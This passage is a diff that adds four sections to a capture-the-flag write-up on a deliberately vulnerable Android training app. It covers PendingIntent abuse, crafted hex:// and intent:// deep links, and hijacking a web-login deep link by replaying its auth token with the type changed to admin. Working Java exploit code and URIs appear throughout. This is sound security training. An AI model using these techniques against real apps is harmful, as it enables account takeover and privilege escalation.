@@ -1037,6 +1037,218 @@ After Flag 12 received the result, both `LOGIN=true` and `token=1094795585` were
 
 **Flag:** `HXT{tricky-intent-condition-bjhs782}`
 
+# Flag 22 — Receiving a Flag Through a Mutable PendingIntent
+
+I opened `Flag22Activity` in JADX and first checked how it handled the incoming Intent. I found that it was looking for a `PendingIntent` using the key `"PENDING"`:
+
+```java
+PendingIntent pendingIntent =
+    (PendingIntent) getIntent().getParcelableExtra("PENDING");
+```
+
+I learned that a **PendingIntent** is a token that allows another app or component to perform an action on behalf of the app that created it. Using this knowledge, I realized that instead of giving Flag22 a normal Intent, I could give it a PendingIntent that points to an Activity in my own app.
+
+Flag22 then creates an Intent containing the flag:
+
+```java
+intent.putExtra("success", true);
+intent.putExtra("flag", this.f.appendLog(this.flag));
+```
+
+and sends that Intent through the PendingIntent:
+
+```java
+pendingIntent.send(this, 0, intent);
+```
+
+So I created a PendingIntent targeting my `Attack_Receiver_Activity`:
+
+```java
+Intent targetIntent = new Intent(
+        this,
+        Attack_Receiver_Activity.class
+);
+
+PendingIntent pendingIntent = PendingIntent.getActivity(
+        this,
+        0,
+        targetIntent,
+        PendingIntent.FLAG_MUTABLE
+);
+```
+
+I used `FLAG_MUTABLE` because Flag22 supplies the Intent containing the `"flag"` extra when it calls `pendingIntent.send()`.
+
+I then launched `Flag22Activity` and passed my PendingIntent through the `"PENDING"` extra:
+
+```java
+Intent intent = new Intent();
+
+intent.setClassName(
+        "io.hextree.attacksurface",
+        "io.hextree.attacksurface.activities.Flag22Activity"
+);
+
+intent.putExtra("PENDING", pendingIntent);
+
+startActivity(intent);
+```
+
+Finally, in my `Attack_Receiver_Activity`, I retrieved the `"flag"` extra from the Intent that Flag22 sent through my PendingIntent:
+
+```java
+Intent intent = getIntent();
+
+String flag = intent.getStringExtra("flag");
+
+Toast.makeText(
+        this,
+        flag,
+        Toast.LENGTH_LONG
+).show();
+```
+
+After running it, the flag was received by my Activity and displayed:
+
+**Flag: `HXT{received-mutable-flags-xa81b}`**
+
+# Flag 13 — Creating a `hex://open/` Link
+
+I learned that **deep links let an Android app be opened through a URL**. I also learned that **intent filters** tell Android which types of links an activity can handle. The `BROWSABLE` category is important here because it allows the activity to be opened through a browser.
+
+While checking the manifest, I noticed that `Flag13Activity` accepts the `hex` scheme and the `flag` host:
+
+```xml
+<data android:scheme="hex"/>
+<data android:host="flag"/>
+```
+
+I then opened `Flag13Activity` in JADX to see what the app was actually checking. The important condition was:
+
+```java
+if (data.getHost().equals("flag")
+        && data.getQueryParameter("action").equals("give-me")) {
+    success(this);
+}
+```
+
+So from this, I understood that I needed a `hex://` link with the host `flag` and the query parameter `action=give-me`.
+
+I entered this into the link builder:
+
+```text
+hex://flag?action=give-me
+```
+
+The link was opened through the browser, the required deep-link conditions were satisfied, and the app triggered `success()`.
+
+The flag I got was:
+
+**`HXT{browser-link-or-app2app-s82h}`**
+
+# Flag 14 — Hijack Web Login
+
+I learned that **deep links can be used to pass authentication information between a website and an Android app**. I opened `Flag14Activity` in JADX and found that it receives `type`, `authToken`, and `authChallenge` from the deep link.
+
+The important part was the `type` check:
+
+```java
+if (queryParameter.equals("user")) {
+} else if (queryParameter.equals("admin")) {
+    success(this);
+}
+```
+
+This showed that changing the `type` from `user` to `admin` would reach the `success()` condition.
+
+The app also checks that the `authChallenge` received in the deep link matches the previously stored challenge and verifies the `authToken`. So I kept both values unchanged.
+
+I used my own `DeeplinkActivity` to receive the original deep link and extract the authentication values:
+
+```java
+String authToken =
+        data.getQueryParameter("authToken");
+
+String authChallenge =
+        data.getQueryParameter("authChallenge");
+```
+
+I then created a modified URI, changing only the `type` to `admin` while keeping the original `authToken` and `authChallenge`:
+
+```java
+Uri modifiedUri = data.buildUpon()
+        .clearQuery()
+        .appendQueryParameter("type", "admin")
+        .appendQueryParameter("authToken", authToken)
+        .appendQueryParameter("authChallenge", authChallenge)
+        .build();
+```
+
+Finally, I forwarded the modified deep link to `Flag14Activity` using a `VIEW` Intent:
+
+```java
+Intent forwardIntent =
+        new Intent(Intent.ACTION_VIEW);
+
+forwardIntent.setData(modifiedUri);
+
+forwardIntent.setClassName(
+        "io.hextree.attacksurface",
+        "io.hextree.attacksurface.activities.Flag14Activity"
+);
+
+startActivity(forwardIntent);
+```
+
+The modified deep link was accepted, the authentication values passed their checks, and changing `type` to `admin` caused the app to trigger `success()` and give the flag.
+
+**Flag:** `HXT{hijacked-login-token-abjh28a}`
+
+# Flag 15 — Creating an `intent://` Link
+
+I learned that **`intent://` links can be used to send an Android Intent through a link**. So I opened `Flag15Activity` in JADX to see what information it expected.
+
+The first thing I noticed was that it checks for a specific Intent action:
+
+```java
+if (isDeeplink(intent) && action.equals("io.hextree.action.GIVE_FLAG")) {
+```
+
+Then I looked at the conditions required to call `success()`. The activity was checking for two extras:
+
+```java
+if (extras.getBoolean("flag", false) && string.equals("flag")) {
+    success(this);
+}
+```
+
+So I knew I needed to send:
+
+```text
+action = flag
+flag = true
+```
+
+I put these values into an `intent://` URI using the appropriate extra types:
+
+```text
+intent://#Intent;action=io.hextree.action.GIVE_FLAG;S.action=flag;B.flag=true;end
+```
+
+Here, `S.action` creates a String extra called `action`, while `B.flag` creates a Boolean extra called `flag`.
+
+I entered the link into the Hextree link builder and opened it. Looking at the activity's received Intent, I could see that the expected action and extras were present:
+
+```text
+[Action]    io.hextree.action.GIVE_FLAG
+[Extra: 'action'] flag
+[Extra: 'flag'] true
+```
+
+Since these matched the conditions I found in JADX, the app called `success()` and displayed the flag.
+
+**Flag:** `HXT{intent-uris-are-cool-12fgv}`
+
 
 # Broadcast Receivers
 
